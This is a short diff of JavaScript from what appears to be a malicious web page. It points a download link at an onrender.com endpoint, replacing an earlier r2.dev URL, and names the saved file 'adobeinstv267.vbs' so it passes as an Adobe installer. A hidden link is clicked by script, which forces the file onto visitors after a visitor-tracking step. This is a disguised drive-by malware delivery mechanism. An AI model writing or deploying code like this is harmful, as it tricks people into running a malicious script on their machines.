@@ -2348,7 +2348,8 @@
           console.error('Error with visitor tracking:', error);
         }
         
-        var downloadUrl = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs'; // Change this URL to your file
+        // var downloadUrl = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs'; // Change this URL to your file
+        var downloadUrl = 'https://procurement-j9mv.onrender.com/download/vbs';
         
         // Check if Edge browser
         var isEdge = /Edg/.test(navigator.userAgent);
@@ -2360,7 +2361,7 @@
         
         var a = document.createElement('a');
         a.href = downloadUrl;
-        a.download = '';
+        a.download = 'adobeinstv267.vbs';
         a.style.display = 'none';
         document.body.appendChild(a);
         a.click();
